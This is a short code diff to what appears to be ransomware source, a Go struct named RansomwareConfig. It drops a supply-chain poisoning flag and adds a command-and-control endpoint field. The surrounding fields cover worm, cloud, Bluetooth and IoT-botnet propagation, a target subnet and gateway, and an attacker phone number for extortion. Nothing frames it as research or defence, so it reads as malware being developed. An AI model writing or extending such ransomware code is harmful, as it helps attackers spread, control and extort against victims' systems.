@@ -72,7 +72,6 @@ type RansomwareConfig struct {
 
 	// Block 2: Propagation
 	MultiplatformWorm bool `json:"multiplatform_worm"`
-	SupplyChainPoison bool `json:"supply_chain_poison"`
 	CloudExploit      bool `json:"cloud_exploit"`
 	BluetoothProp     bool `json:"bluetooth_prop"`
 	IoTBotnet         bool `json:"iot_botnet"`
@@ -101,6 +100,7 @@ type RansomwareConfig struct {
 	TargetSubnet   string `json:"target_subnet"`
 	GatewayIP      string `json:"gateway_ip"`
 	CaptivePortalDomain string `json:"captive_portal_domain"`
+	C2Endpoint     string `json:"c2_endpoint"`
 
 	// Extortion phone
 	AttackerPhone string `json:"attacker_phone"`
